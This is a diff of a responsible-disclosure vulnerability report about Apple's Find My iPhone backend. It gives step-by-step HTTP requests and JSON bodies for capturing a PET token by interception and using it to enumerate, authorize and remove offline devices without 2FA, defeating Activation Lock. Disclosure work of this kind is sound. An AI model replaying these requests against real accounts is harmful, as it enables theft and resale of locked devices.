@@ -1,31 +1,27 @@
-# Title
-
-fmipmobile.icloud.com: improper token scoping allows unauthorized iCloud device removal via PET
-
----
+# fmipmobile.icloud.com: improper token scoping allows unauthorized iCloud device removal via PET
 
 ## Summary
 
-An issue exists in Apple’s Find My iPhone (FMiP) backend (`fmipmobile.icloud.com`) where a valid Apple ID and its associated PET (Private Endpoint Token) can be used to list, authorize, and remove devices from the iCloud account without triggering 2FA or ownership validation mechanisms.
+A vulnerability in Apple's Find My iPhone (FMiP) backend (`fmipmobile.icloud.com`) allows an attacker with a valid Apple ID and its associated PET (Private Endpoint Token) to enumerate and remove devices from the account **without triggering two-factor authentication (2FA)** or validating device ownership.
 
-This bypass enables unauthorized actors who have access to a session token (PET) to unlink offline devices from a user's iCloud account, effectively defeating Activation Lock protection in certain scenarios.
+This could allow unauthorized removal of iCloud-locked devices, potentially defeating Activation Lock protection for offline devices.
 
 ---
 
 ## Impact
 
-An attacker who obtains a PET for an Apple ID can:
+An attacker in possession of a PET token (e.g., from proxying a session or capturing a device token) can:
 
-- Enumerate all devices tied to the account.
-- Authorize per-device access without re-authentication.
-- Remove offline devices silently via the `/remove` endpoint.
-- Bypass the standard iCloud UI protections and security prompts.
+- Enumerate all devices on an iCloud account via `/initClient`
+- Generate per-device scoped tokens via `/authForUserDevice`
+- Submit a device removal request via `/remove`
+- Receive a `200 OK` status and unlink the device silently (if offline)
 
-This undermines the security model of Activation Lock and may enable unauthorized resale or misuse of stolen devices.
+This bypasses iCloud web authentication and trusted device verification workflows, posing a risk to user device security.
 
 ---
 
-## Components Affected
+## Affected Endpoints
 
 - `https://fmipmobile.icloud.com/fmipservice/device/initClient`
 - `https://fmipmobile.icloud.com/fmipservice/device/authForUserDevice`
@@ -35,94 +31,109 @@ This undermines the security model of Activation Lock and may enable unauthorize
 
 ## What is Needed to Reproduce
 
-- A valid Apple ID and password
-- A captured PET (Private Endpoint Token) via session proxying or client instrumentation
-- At least one offline iCloud-registered device tied to the account
+- A valid Apple ID and password (controlled test account)
+- A valid PET token (captured from an iOS session or extracted using MITM proxying)
+- At least one device registered under the account in **offline state**
 
-*Note: This was tested using a controlled test account and device.*
+> Note: This PoC was conducted using a test account and simulated devices.
 
 ---
 
 ## Steps to Reproduce
 
-1. **Capture a valid PET** from a real session using a proxy (Burp/Zap) or MITM TLS proxy on a jailbroken iOS device.
-2. Use the PET with the Apple ID to authenticate via Basic Auth to:
+1. **Capture PET token** from a legitimate iOS session:
+   - Intercept HTTPS requests from the Find My app
+   - Extract PET from Basic Authorization header: `Authorization: Basic base64(AppleID:PET)`
 
-POST https://fmipmobile.icloud.com/fmipservice/device/initClient
+2. **List devices**
 
-css
-Copy
-Edit
-Header:
-Authorization: Basic base64(apple_id:PET)
+   ```
+   POST https://fmipmobile.icloud.com/fmipservice/device/initClient
+   Authorization: Basic base64(appleid:PET)
+   Content-Type: application/json
+   ```
 
-css
-Copy
-Edit
+   - Response: JSON with `content[]` (device list) and `serverContext`
 
-3. Parse the JSON response to extract the `content[]` array (device list) and `serverContext`.
+3. **Authorize a device**
 
-4. For each device:
-- POST to:
-  ```
-  https://fmipmobile.icloud.com/fmipservice/device/authForUserDevice
-  ```
-  JSON Body:
-  ```json
-  { "authToken": "PET", "device": "<DEVICE_ID>" }
-  ```
-  → Returns a scoped `authToken` for the device.
+   ```
+   POST https://fmipmobile.icloud.com/fmipservice/device/authForUserDevice
+   Content-Type: application/json
 
-5. Use that token to POST to:
-https://fmipmobile.icloud.com/fmipservice/device/remove
+   {
+     "authToken": "PET",
+     "device": "<DEVICE_ID>"
+   }
+   ```
 
-css
-Copy
-Edit
-Body:
-```json
-{
-  "device": "<DEVICE_ID>",
-  "authToken": "<SCOPED_TOKEN>",
-  "serverContext": {...},
-  "clientContext": { "appVersion": "7.0" }
-}
-Observe a statusCode: 200 response if the device is offline, indicating successful removal.
+   - Response:
 
-Expected Behavior
-Device removal should require full authentication including 2FA or trusted device confirmation.
+   ```json
+   {
+     "authToken": "<DEVICE_SCOPED_TOKEN>"
+   }
+   ```
 
-Tokens should be scoped per-device and per-session.
+4. **Remove the device**
 
-PET should not allow access to sensitive device control operations unless recently verified.
+   ```
+   POST https://fmipmobile.icloud.com/fmipservice/device/remove
+   Authorization: Basic base64(appleid:PET)
+   Content-Type: application/json
 
-Actual Behavior
-PETs allow unrestricted use of initClient, authForUserDevice, and remove.
+   {
+     "device": "<DEVICE_ID>",
+     "authToken": "<DEVICE_SCOPED_TOKEN>",
+     "serverContext": { ... },
+     "clientContext": { "appVersion": "7.0" }
+   }
+   ```
 
-Offline devices are removable with just a token and Apple ID.
+5. **Expected result**: `statusCode: 200` if the device is offline, indicating successful removal.
 
-No additional ownership or session validation is enforced.
+---
 
-PoC
-A proof-of-concept is available in both PHP and Python and will be attached to this report as a ZIP file with the following files:
+## Expected Behavior
 
-poc_device_remove.py – Python implementation
+- PET token should not be sufficient to remove devices.
+- Removal actions should trigger 2FA or trusted device re-authentication.
+- API endpoints should verify ownership and recent session activity.
 
-poc_device_remove.php – PHP implementation
+---
 
-demo_log.txt – Terminal output demonstrating successful removal
+## Actual Behavior
 
-No personal account or production data is included.
+- PET token allows unrestricted access to device enumeration and removal endpoints.
+- Offline devices can be silently removed with no user prompt or confirmation.
+- 2FA is not triggered for any step in this flow.
 
-Recommendations
-Enforce device ownership revalidation on remove endpoint.
+---
 
-Scope PET tokens to specific endpoints and expiration windows.
+## Proof of Concept
 
-Require reauthentication or 2FA for any unlinking/removal request.
+A proof-of-concept is attached in a ZIP bundle and includes:
 
-Disclosure Policy
-This report is submitted in good faith under Apple’s Responsible Disclosure policy. I am open to providing additional technical validation or test accounts if needed.
+- `poc_device_remove.py` – Python script demonstrating the full flow
+- `poc_device_remove.php` – Equivalent PHP version
+- `demo_log.txt` – Output showing successful removal of an offline test device
 
-Thank you,
-[Your Name or Alias]
+No production credentials or personal data are included.
+
+---
+
+## Recommendations
+
+- Enforce multi-factor authentication before allowing device removal operations.
+- Scope PETs strictly to session context and short expiration windows.
+- Introduce server-side checks to prevent sensitive operations on expired or offline sessions.
+
+---
+
+## Disclosure Policy
+
+This report is submitted in accordance with Apple’s Responsible Disclosure program. I am available to provide additional information, test environment access, or confirmation as needed.
+
+Thank you,  
+Arber Kadriu
+kadriuarber@icloud.com
